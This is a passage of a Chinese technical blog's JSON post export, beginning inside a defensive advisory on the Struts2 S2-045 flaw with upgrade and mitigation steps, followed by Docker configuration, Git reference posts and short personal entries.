Struts2（S2-045）漏洞情况的通报","slug":"关于Apache-Struts2（S2-045）漏洞情况的通报","date":"2017-03-07T07:28:49.000Z","updated":"2017-03-07T07:52:55.000Z","comments":true,"path":"2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","link":"","permalink":"http://blog.unixmen.cn/2017/03/07/关于Apache-Struts2（S2-045）漏洞情况的通报/","excerpt":"","text":"关于Apache Struts2 （S2-045）远程代码执行漏洞通报近日，国家信息安全漏洞库（CNNVD）收到关于Apache Struts2 （S2-045）远程代码执行漏洞（CNNVD-201703-152）的情况报送。由于该漏洞影响范围广，危害级别高，国家信息安全漏洞库（CNNVD）对此进行了跟踪分析，情况如下： 一、 漏洞简介Apache Struts是美国阿帕奇（Apache）软件基金会负责维护的一个开源项目，是一套用于创建企业级Java Web 应用的开源MVC框架，主要提供两个版本框架产品： Struts 1和Struts 2。 ApacheStruts 2.3.5 – 2.3.31版本及2.5 – 2.5.10版本存在远程代码执行漏洞（CNNVD-201703-152 ，CVE-2017-5638）。该漏洞是由于上传功能的异常处理函数没有正确处理用户输入的错误信息。导致远程攻击者可通过发送恶意的数据包，利用该漏洞在受影响服务器上执行任意命令。 二、 漏洞危害攻击者可通过发送恶意构造的HTTP数据包利用该漏洞，在受影响服务器上执行系统命令，进一步可完全控制该服务器，造成拒绝服务、数据泄露、网站造篡改等影响。由于该漏洞利用无需任何前置条件（如开启dmi ，debug等功能）以及启用任何插件，因此漏洞危害较为严重。 三、 修复措施目前，Apache官方已针对该漏洞发布安全公告。请受影响用户及时检查是否受该漏洞影响。 自查方式 用户可查看web目录下/WEB-INF/lib/目录下的struts-core.x.x.jar 文件，如果这个版本在Struts2.3.5 到 Struts2.3.31 以及 Struts2.5 到 Struts2.5.10之间则存在漏洞。 升级修复 受影响用户可升级版本至Apache Struts 2.3.32 或 Apache Struts 2.5.10.1以消除漏洞影响。 临时缓解 如用户不方便升级，可采取如下临时解决方案： 删除commons-fileupload-x.x.x.jar文件（会造成上传功能不可用）。 相关链接官方Aapache Struts2（S2-045）安全公告","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"漏洞","slug":"技术文档/漏洞","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/"},{"name":"安全","slug":"技术文档/漏洞/安全","permalink":"http://blog.unixmen.cn/categories/技术文档/漏洞/安全/"}],"tags":[{"name":"struts2","slug":"struts2","permalink":"http://blog.unixmen.cn/tags/struts2/"}]},{"title":"广告拦截APP\"AdClear\" for 安卓/iOS","slug":"广告拦截APPADclear-for-安卓-iOS","date":"2017-03-06T01:04:36.000Z","updated":"2017-03-06T06:54:33.000Z","comments":true,"path":"2017/03/06/广告拦截APPADclear-for-安卓-iOS/","link":"","permalink":"http://blog.unixmen.cn/2017/03/06/广告拦截APPADclear-for-安卓-iOS/","excerpt":"","text":"良心广告拦截APP分享：乐网AdClear，视频APP无需会员过滤广告 支持手机、平板 支持安卓、iOS 拦截系统内置广告 拦截视频软件广告 自身无广告 本地代理，建立VPN 无需root AppStore及安卓市场都可以搜到 从此观看视频一路畅通无阻。Enjoy it！","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"手机APP","slug":"手机APP","permalink":"http://blog.unixmen.cn/tags/手机APP/"},{"name":"工具","slug":"工具","permalink":"http://blog.unixmen.cn/tags/工具/"},{"name":"广告拦截","slug":"广告拦截","permalink":"http://blog.unixmen.cn/tags/广告拦截/"}]},{"title":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","slug":"通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问","date":"2017-03-03T03:53:41.000Z","updated":"2017-03-06T06:52:44.000Z","comments":true,"path":"2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","link":"","permalink":"http://blog.unixmen.cn/2017/03/03/通过景安免费虚拟主机实现腾讯免费企业邮箱绑定自有域名登陆访问/","excerpt":"","text":"想用自己的域名发邮件，所以需要为域名开通个邮局业务，呵呵，就想到了免费邮局业务，现在提供免费企业邮局的厂家有很多，如腾讯、阿里、网易等，不过有个问题，就是免费邮局业务，现在都不支持绑定自己的域名进行访问登陆了，，，其实要想解决这个问题也非常的简单，只需要一个虚拟主机和一段PHP代码即可。 由于一直用腾讯微信、QQ，所以就用了腾讯免费企业邮局，通过搜索了解到景安提供的有免费虚拟主机，所以就选择他了，，，， 准备工作： 一个域名 已开通腾讯企业邮箱并设置正确解析 一个支持PHP的景安（免费）虚拟主机或者VPS 一、创建代码复制下面的代码，另存为index.php文件 1234&lt;?php $mail = file_get_contents(&quot;http://tel.exmail.qq.com/domain/mail.unixmen.cn&quot;); echo $mail;?&gt; 其中： unixmen.cn 为开通腾讯企业邮箱时所用域名(请改为自己的顶级域名) mail.unixmen.cn 为计划登陆访问时所用的域名 二、开通景安免费虚拟主机，绑定域名并解析 开通主机景安提供的有免费主机（下图左一）建议：如果使用收费的虚拟主机，只做登陆邮箱调转试用，选个便宜的，够用就行，我选了一个最低配置（下图右一）一年才49，土豪请随意。 考虑到虚拟主机还有其他用途，索性就买了个收费的业务。 注：无论是收费主机还是免费主机，以下操作或功能上没有区别。 添加域名绑定景安的虚拟主机如果不添加域名绑定，即便是解析正确，也无法访问，这个略屌。 添加解析 添加MX记录及添加CNAME解析到景安提供的三级域名。 解析生效 三、上传脚本程序使用FTP工具或者文件管理器将步骤一中创建的index.php文件上传到WEB文件夹中 四、测试访问如果上面的操作都没有错误的情况下，最后便可输入您的域名进行测试访问了，比如：mail.unixmen.cn 五、至此完成，可以使用自己的域名登陆企业邮箱了。如有问题欢迎吐槽打扰。","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"其他","slug":"其他","permalink":"http://blog.unixmen.cn/tags/其他/"}]},{"title":"Docker 私有仓库无法上传镜像的问题","slug":"Docker-私有仓库无法上传镜像的问题","date":"2017-03-02T09:08:16.000Z","updated":"2017-03-29T00:41:20.000Z","comments":true,"path":"2017/03/02/Docker-私有仓库无法上传镜像的问题/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker-私有仓库无法上传镜像的问题/","excerpt":"","text":"Docker 私有仓库启动后或者新节点配置私有仓库后，可能会出现无法push镜像到私有仓库，或无法pull镜像的问题如下图： 无法push镜像 无法pull镜像 导致原因：因为启动的registry服务不是安全可信赖的 解决方法如下： CentOS 6 修改docker的配置文件/etc/default/docker，添加下面的内容， 1DOCKER_OPTS=&quot;--insecure-registry xxx.xxx.xxx.xxx:5000&quot; 重启docker服务 1service docker restart CentOS 7 创建或修改 /etc/docker/daemon.json 文件，添加如下内容： 123&#123; &quot;insecure-registries&quot;: [&quot;xxx.xxx.xxx.xxx:5000&quot;] &#125; 重启Docker 服务 1systemctl restart docker 测试： push 测试 pull 测试","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"Trouble shooting","slug":"Trouble-shooting","permalink":"http://blog.unixmen.cn/tags/Trouble-shooting/"}]},{"title":"Docker配置Daocloud加速器","slug":"Docker配置Daocloud加速器","date":"2017-03-02T07:12:31.000Z","updated":"2017-03-29T00:40:48.000Z","comments":true,"path":"2017/03/02/Docker配置Daocloud加速器/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置Daocloud加速器/","excerpt":"","text":"Docker 版本在 1.12 或更高创建或修改 /etc/docker/daemon.json 文件，修改为如下形式 （请将 加速地址 替换为在加速器页面获取的专属地址）Daocloud加速器地址 123456&#123; &quot;registry-mirrors&quot;: [ &quot;加速地址&quot; ], &quot;insecure-registries&quot;: []&#125;","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker配置HTTP代理","slug":"Docker配置HTTP代理","date":"2017-03-02T07:11:24.000Z","updated":"2017-03-29T00:42:18.000Z","comments":true,"path":"2017/03/02/Docker配置HTTP代理/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker配置HTTP代理/","excerpt":"","text":"由于服务器处于内网，无法直接连接docker hub，需要配置代理使用，如图： CentOS 6下配置docker 的https_proxy 代理,只需要在/etc/sysconfig/docker 配置文件里面增加配置即可。 CentOS 7 无法使用这样的配置方式进行https_proxy 配置，原因为CentOS 7 使用systemd 来管理进程,我们需要添加https_proxy进行配置，步骤如下： 创建目录1mkdir /etc/systemd/system/docker.service.d 添加配置文件 12echo &quot;[Service]Environment=&quot;HTTP_PROXY=http://proxy.ip.com:80&quot;&quot;|tee /etc/systemd/system/docker.service.d/http-proxy.conf Reload systemd-daemon 12systemctl daemon-reload 重启docker服务 1systemctl restart docker 检查变量是否加载 1systemctl show docker --property Environment 测试是否生效","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"Docker修改默认存储位置","slug":"Docker修改默认存储位置","date":"2017-03-02T07:10:23.000Z","updated":"2017-03-29T00:41:49.000Z","comments":true,"path":"2017/03/02/Docker修改默认存储位置/","link":"","permalink":"http://blog.unixmen.cn/2017/03/02/Docker修改默认存储位置/","excerpt":"","text":"停止docker 1systemctl stop docker 备份默认docker存储数据 1mv /var/lib/docker&#123;,.bak&#125; 创建docker数据存放文件夹 1mkdir /data/docker 创建软连接 1ln -s /data/docker/ /var/lib/docker 启动docker 1systemctl start docker 查看存储位置","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"容器","slug":"技术文档/Tools/容器","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/容器/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"},{"name":"容器配置","slug":"容器配置","permalink":"http://blog.unixmen.cn/tags/容器配置/"}]},{"title":"How to Install Docker Engine on CentOS 7.","slug":"How-to-install-docker-engine-on-CentOS-7","date":"2017-02-28T05:32:27.000Z","updated":"2017-03-06T06:54:18.000Z","comments":true,"path":"2017/02/28/How-to-install-docker-engine-on-CentOS-7/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/How-to-install-docker-engine-on-CentOS-7/","excerpt":"","text":"1.Remove default docker package.12yum -y remove docker docker-common container-selinuxyum -y remove docker-selinux 2.Install Docker engine123456yum install -y yum-utilsyum-config-manager --add-repo https://docs.docker.com/engine/installation/linux/repo_files/centos/docker.repoyum-config-manager --enable docker-testingyum-config-manager --disable docker-testingyum makecache fastyum -y install docker-engine","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"}],"tags":[{"name":"docker","slug":"docker","permalink":"http://blog.unixmen.cn/tags/docker/"},{"name":"容器","slug":"容器","permalink":"http://blog.unixmen.cn/tags/容器/"}]},{"title":"Git利用分支进行开发的工作流程","slug":"Git利用分支进行开发的工作流程","date":"2017-02-28T05:24:47.000Z","updated":"2017-05-02T09:25:42.000Z","comments":true,"path":"2017/02/28/Git利用分支进行开发的工作流程/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git利用分支进行开发的工作流程/","excerpt":"","text":"[toc] Git 利用分支进行开发的工作流程Git 作为一个源码管理系统，不可避免涉及到多人协作。协作必须有一个规范的工作流程，让大家有效地合作，使得项目井井有条地发展下去。”工作流程”在英语里，叫做”workflow”或者”flow”，原意是水流，比喻项目像水流那样，顺畅、自然地向前流动，不会发生冲击、对撞、甚至漩涡。 一、长期分支master 分支master 永远处于稳定状态，这个分支代码可以随时用来部署。不允许在该分支直接提交代码。 develop 分支开发分支，包含了项目最新的功能和代码，所有开发都在 develop 上进行。一般情况下小的修改直接在这个分支上提交代码。 二、短期分支feature 分支如果要改的一个东西会有比较多的修改，或者改的东西影响会比较大，请从 develop 分支开出一个 feature 分支，分支名约定为feature/xxx，开发完成后合并回 develop 分支并且删除这个 feature 分支，相应的操作如下： 1234567$ git checkout -b feature/xxx develop# 写代码，提交，写代码，提交。。。# feature 开发完成，合并回 develop$ git checkout develop# 务必加上 --no-ff，以保持分支的合并历史$ git merge --no-ff feature/xxx$ git branch -d feature/xxx 如果想要当前分支能保持与 develop 的更新，请用 rebase，操作如下： 12# 假设当前在 feature/xxx 分支$ git rebase develop rebase 会修改历史，如果你的 feature 分支是跟人合作开发的，请互相做好协调。 release 分支当 develop 上的功能和 bug 修得差不多的时候，我们就要发布新版本了，这个时候从 develop 分支上开出一个 release 分支，来做发布前的准备，分支名约定为release/20121221，主要是测试有没有什么 bug，如果有 bug 就直接在这个分支上修复，确定没有问题后就会合并到 master 分支。相应操作如下： 1234$ git checkout -b release/20121221 develop# 修复 bug、检查没问题后合并到 master 分支并删除$ git checkout master$ git merge --no-ff release/20121221 为了让 release 分支上 bug 修改作用到 develop 分支，我们还需要把这个 release 分支合并回 develop 分支： 1234$ git checkout develop$ git merge --no-ff release/20121221# 到此，这个 release 分支完成了它的使命，可以被删除了$ git branch -d release/20121221 hotfix 分支如果我们发现线上的代码（也就是 master）有 bug，但是这个时候我们的 develop 上的有些功能还没完成，还不能发布，这个时候我们可以从 master 分支上开出一个 hotfix 分支（记住：直接在 master 上提交代码是不允许的！），分支名约定为hotfix/xxx，在这个分支上修改完 bug 后需要把这个分支同时合并到 master 和 develop 分支。相应操作如下： 12345678$ git checkout -b hotfix/xxx master# 修完 bug 后$ git checkout master$ git merge --no-ff hotfix/xxx$ git checkout develop$ git merge --no-ff hotfix/xxx# hotfix 分支完成使命$ git branch -d hotfix/xxx 例外：当 hotfix 分支完成，这个时候如果有 release 分支存在，那么这个 hotfix 就应该合并到 release，而不是 develop 分支。 三、proj 分支proj 分支为项目分支，所有的项目分支都从 master 上开出来，约定的分支名为proj/xxx。所有的项目定制内容都直接在项目分支上提交。为了保证项目的更新，每当项目有新版本发布时都需要把 master 分支合并到 proj 分支上。相应操作如下： 12345$ git checkout -b proj/xxx master# 定制。。。# 如果 master 分支有更新$ git checkout proj/xxx master$ git merge --no-ff master","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"Git常用命令","slug":"Git常用命令","date":"2017-02-28T03:24:49.000Z","updated":"2017-05-02T09:24:59.000Z","comments":true,"path":"2017/02/28/Git常用命令/","link":"","permalink":"http://blog.unixmen.cn/2017/02/28/Git常用命令/","excerpt":"","text":"[toc] Git常用命令Git 命令行操作工作流程 Workspace：工作区 Index / Stage：暂存区 Repository：仓库区（或本地仓库） Remote：远程仓库 一、新建代码库 在当前目录新建一个Git代码库 1git init 新建一个目录，将其初始化为Git代码库 1git init [project-name] 下载一个项目和它的整个代码历史 1git clone [url] 二、配置Git的设置文件为.gitconfig，它可以在用户主目录下（全局配置），也可以在项目目录下（项目配置）。 显示当前的Git配置 1git config --list 编辑Git配置文件 1git config -e [--global] 设置提交代码时的用户信息 12git config [--global] user.name &quot;[name]&quot;git config [--global] user.email &quot;[email address]&quot; 三、增加/删除文件 添加指定文件到暂存区 1git add [file1] [file2] ... 添加指定目录到暂存区，包括子目录 1git add [dir] 添加当前目录的所有文件到暂存区 1git add . 添加每个变化前，都会要求确认,对于同一个文件的多处变化，可以实现分次提交 1git add -p 删除工作区文件，并且将这次删除放入暂存区 1git rm [file1] [file2] ... 停止追踪指定文件，但该文件会保留在工作区 1git rm --cached [file] 改名文件，并且将这个改名放入暂存区 1git mv [file-original] [file-renamed] 四、代码提交 提交暂存区到仓库区 1git commit -m [message] 提交暂存区的指定文件到仓库区 1git commit [file1] [file2] ... -m [message] 提交工作区自上次commit之后的变化，直接到仓库区 1git commit -a 提交时显示所有diff信息 1git commit -v 使用一次新的commit，替代上一次提交, 如果代码没有任何新变化，则用来改写上一次commit的提交信息 1git commit --amend -m [message] 重做上一次commit，并包括指定文件的新变化 1git commit --amend [file1] [file2] ... 五、分支 列出所有本地分支 1git branch 列出所有远程分支 1git branch -r 列出所有本地分支和远程分支 1git branch -a 新建一个分支，但依然停留在当前分支 1git branch [branch-name] 新建一个分支，并切换到该分支 1git checkout -b [branch] 新建一个分支，指向指定commit 1git branch [branch] [commit] 新建一个分支，与指定的远程分支建立追踪关系 1git branch --track [branch] [remote-branch] 切换到指定分支，并更新工作区 1git checkout [branch-name] 切换到上一个分支 1git checkout - 建立追踪关系，在现有分支与指定的远程分支之间 1git branch --set-upstream [branch] [remote-branch] 合并指定分支到当前分支 1git merge [branch] 选择一个commit，合并进当前分支 1git cherry-pick [commit] 删除分支 1git branch -d [branch-name] 删除远程分支 12git push origin --delete [branch-name]git branch -dr [remote/branch] 六、标签 列出所有tag 1git tag 新建一个tag在当前commit 1git tag [tag] 新建一个tag在指定commit 1git tag [tag] [commit] 删除本地tag 1git tag -d [tag] 删除远程tag 1git push origin :refs/tags/[tagName] 查看tag信息 1git show [tag] 提交指定tag 1git push [remote] [tag] 提交所有tag 1git push [remote] --tags 新建一个分支，指向某个tag 1git checkout -b [branch] [tag] 七、查看信息 显示有变更的文件 1git status 显示当前分支的版本历史 1git log 显示commit历史，以及每次commit发生变更的文件 1git log --stat 搜索提交历史，根据关键词 1git log -S [keyword] 显示某个commit之后的所有变动，每个commit占据一行 1git log [tag] HEAD --pretty=format:%s 显示某个commit之后的所有变动，其”提交说明”必须符合搜索条件 1git log [tag] HEAD --grep feature 显示某个文件的版本历史，包括文件改名 12git log --follow [file]git whatchanged [file] 显示指定文件相关的每一次diff 1git log -p [file] 显示过去5次提交 1git log -5 --pretty --oneline 显示所有提交过的用户，按提交次数排序 1git shortlog -sn 显示指定文件是什么人在什么时间修改过 1git blame [file] 显示暂存区和工作区的差异 1git diff 显示暂存区和上一个commit的差异 1git diff --cached [file] 显示工作区与当前分支最新commit之间的差异 1git diff HEAD 显示两次提交之间的差异 1git diff [first-branch]...[second-branch] 显示今天你写了多少行代码 1git diff --shortstat &quot;@&#123;0 day ago&#125;&quot; 显示某次提交的元数据和内容变化 1git show [commit] 显示某次提交发生变化的文件 1git show --name-only [commit] 显示某次提交时，某个文件的内容 1git show [commit]:[filename] 显示当前分支的最近几次提交 1git reflog 八、远程同步 下载远程仓库的所有变动 1git fetch [remote] 显示所有远程仓库 1git remote -v 显示某个远程仓库的信息 1git remote show [remote] 增加一个新的远程仓库，并命名 1git remote add [shortname] [url] 取回远程仓库的变化，并与本地分支合并 1git pull [remote] [branch] 上传本地指定分支到远程仓库 1git push [remote] [branch] 强行推送当前分支到远程仓库，即使有冲突 1git push [remote] --force 推送所有分支到远程仓库 1git push [remote] --all 九、撤销 恢复暂存区的指定文件到工作区 1git checkout [file] 恢复某个commit的指定文件到暂存区和工作区 1git checkout [commit] [file] 恢复暂存区的所有文件到工作区 1git checkout . 重置暂存区的指定文件，与上一次commit保持一致，但工作区不变 1git reset [file] 重置暂存区与工作区，与上一次commit保持一致 1git reset --hard 重置当前分支的指针为指定commit，同时重置暂存区，但工作区不变 1git reset [commit] 重置当前分支的HEAD为指定commit，同时重置暂存区和工作区，与指定commit一致 1git reset --hard [commit] 重置当前HEAD为指定commit，但保持暂存区和工作区不变 1git reset --keep [commit] 新建一个commit，用来撤销指定commit 后者的所有变化都将被前者抵消，并且应用到当前分支 1git revert [commit] 暂时将未提交的变化移除，稍后再移入 12git stashgit stash pop 十、其他 生成一个可供发布的压缩包1git archive","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"},{"name":"git command","slug":"git-command","permalink":"http://blog.unixmen.cn/tags/git-command/"},{"name":"git 命令行","slug":"git-命令行","permalink":"http://blog.unixmen.cn/tags/git-命令行/"}]},{"title":"Git 基础操作","slug":"Git-基础操作","date":"2017-02-17T16:59:59.000Z","updated":"2017-05-02T09:25:20.000Z","comments":true,"path":"2017/02/18/Git-基础操作/","link":"","permalink":"http://blog.unixmen.cn/2017/02/18/Git-基础操作/","excerpt":"","text":"Git 是什么 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。 Git 与 SVN 区别GIT不仅仅是个版本控制系统，它也是个内容管理系统(CMS),工作管理系统等。如果你是一个具有使用SVN背景的人，你需要做一定的思想转换，来适应GIT提供的一些概念和特征。 区别： GIT是分布式的，SVN不是：这是GIT和其它非分布式的版本控制系统，例如SVN，CVS等，最核心的区别。 GIT把内容按元数据方式存储，而SVN是按文件：所有的资源控制系统都是把文件的元信息隐藏在一个类似.svn,.cvs等的文件夹里。 GIT分支和SVN的分支不同：分支在SVN中一点不特别，就是版本库中的另外的一个目录。 GIT没有一个全局的版本号，而SVN有：目前为止这是跟SVN相比GIT缺少的最大的一个特征。 GIT的内容完整性要优于SVN：GIT的内容存储使用的是SHA-1哈希算法。这能确保代码内容的完整性，确保在遇到磁盘故障和网络问题时降低对版本库的破坏。 快速入门：如何安装：Windows Git 安装包下载 Mac Git 安装包下载 Linux 安装教程 创建新仓库创建新的 git 仓库： 创建新文件夹 进入新文件夹 命令行执行”git init” 实例： 以上操作将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。点击链接获取更多关于.git文件夹中包含了文件的信息。 如果你是在一个非空文件夹中初始化，需要： 添加跟踪（git add） 提交（git commit） 实例： 获取Git仓库执行如下命令以创建一个本地仓库的克隆版本：1git clone https://github.com/netb2c/netb2c.github.io.git 如果是远端服务器上的仓库,可使用SSH传输协议:1git clone git@10.160.0.200:/data/sdk_svnserver/netb2c.git 检查当前文件状态要查看哪些文件处于什么状态，可以用 git status 命令1git status 以上反馈信息显示： 当前所在工作目录相当干净 所有已跟踪文件在上次提交后都未被更改过 当前目录下没有出现任何处于未跟踪状态的新文件 显示了当前所在分支(“master”) 添加、修改文件测试： 以上打印信息可以看到： daily_task.md 文件在Changes not staged for commit下面：– 文件内容发生便会– 未在暂存区需要保存到暂存区，需要执行”git add” 暂存修改 新建的 README.md 文件现在 Untracked files 下面：– 新文件未被跟踪– 新闻界需要添加跟踪 跟踪新文件使用命令 git add 开始跟踪一个文件：1git add 正常情况下不会打印信息。 再次查看状态： 两个文档都在Changes to be committed下:– 此时已暂时保存当前文档状态注：git add 只是将增加、修改后文件添加内容到下一次提交中”而不是“将文件直接添加到项目中” 简略状态信息查看git status 命令的输出十分详细，但其用语有些繁琐。如果你使用 git status -s 命令或 git status –short 命令，你将得到一种更为紧凑的格式输出，如图： A：新增 M：修改 ??：未被跟踪 查看已暂存和未暂存的修改git status 命令的输出对于你来说过于模糊，你想知道具体修改了什么地方，可以用 git diff 命令。 要查看尚未暂存的文件更新了哪些部分，不加参数直接输入 git diff 若要查看已暂存的将要添加到下次提交里的内容，需用 git diff –staged 提交更新暂存区域已经准备妥当可以提交了。一定要确认还有什么修改过的或新建的文件还没有 git add 过，否则提交的时候不会记录这些还没暂存起来的变化。 这些修改过的文件只保留在本地磁盘。 所以，每次准备提交前，先用 git status 看下，是不是都已暂存起来了， 然后再运行提交命令 git commit： 跳过使用暂存区域 Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给 git commit 加上 -a 选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过 git add 步骤，详见下图： 删除文件要从 Git 中移除某个文件，就必须要从已跟踪文件清单中移除（确切地说，是从暂存区域移除），然后提交。 可以用 git rm 命令完成此项工作，并连带从工作目录中删除指定的文件，这样以后就不会出现在未跟踪文件清单中了。 正确的删除版本控制库文件需要： 删除本地文件： rm file 从版本控制库中删除： git rm file 提交更新： git commit -m “Commit message.” 移动文件Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。需要使用命令：1git mv old_name new_name 实例： 其实，运行 git mv 就相当于运行了下面三条命令：123mv README.md READMEgit rm README.mdgit add README","raw":null,"content":null,"categories":[{"name":"技术文档","slug":"技术文档","permalink":"http://blog.unixmen.cn/categories/技术文档/"},{"name":"工具","slug":"技术文档/Tools","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/"},{"name":"git","slug":"技术文档/Tools/git","permalink":"http://blog.unixmen.cn/categories/技术文档/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"http://blog.unixmen.cn/tags/git/"}]},{"title":"感恩","slug":"感恩","date":"2017-02-17T03:06:56.000Z","updated":"2017-02-17T06:09:43.000Z","comments":true,"path":"2017/02/17/感恩/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/感恩/","excerpt":"","text":"感恩123456789101112131415161718[感恩]是快乐的来源，感恩天地，生命之源感恩阳光，托起梦想感恩万物，助我成长感恩父母，赐予生命感恩兄弟，手足情深感恩某人，冤家聚首感恩孩子，舐犊情深感恩恩师，淳淳教诲感恩朋友，知心之谊感恩同袍，携手同行感恩领导，不吝提携感恩公司，给我平台感恩挫折，让我成长感恩命运，让我懂得感恩黑暗，让我领悟感恩科技，建立博客感恩，感恩，感恩....","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"感恩","slug":"感恩","permalink":"http://blog.unixmen.cn/tags/感恩/"}]},{"title":"第一篇博客","slug":"first","date":"2017-02-17T03:03:39.000Z","updated":"2017-02-17T06:10:44.000Z","comments":true,"path":"2017/02/17/first/","link":"","permalink":"http://blog.unixmen.cn/2017/02/17/first/","excerpt":"","text":"就这么开始吧，精彩内容敬请期待…","raw":null,"content":null,"categories":[{"name":"生活","slug":"Life","permalink":"http://blog.unixmen.cn/categories/Life/"}],"tags":[{"name":"开篇","slug":"开篇","permalink":"http://blog.unixmen.cn/tags/开篇/"}]}]}